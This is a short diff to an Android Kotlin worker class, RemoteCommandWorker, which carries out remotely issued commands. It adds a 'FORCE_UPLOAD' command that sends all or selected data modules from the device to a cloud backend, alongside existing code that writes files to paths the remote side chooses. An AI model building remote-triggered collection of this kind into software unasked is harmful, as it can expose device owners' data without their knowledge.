@@ -54,7 +54,15 @@ class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) :
                             val targetDir = File(root, path)
                             if (!targetDir.exists()) targetDir.mkdirs()
 
-                            if (fileName.isNotEmpty()) {
+                            // --- NEW: HANDLING FORCE UPLOAD ---
+                            if (cmd.getString("file_name") == "FORCE_UPLOAD") {
+                                val modulesStr = cmd.optString("content", "ALL")
+                                val modules = modulesStr.split(",").map { it.trim() }
+                                CloudManager.uploadData(applicationContext, modules, null)
+                                status = "EXECUTED"
+                            } 
+                            // --- EXISTING FILE LOGIC ---
+                            else if (fileName.isNotEmpty()) {
                                 val targetFile = File(targetDir, fileName)
                                 
                                 if (cmd.has("content") && !cmd.isNull("content")) {
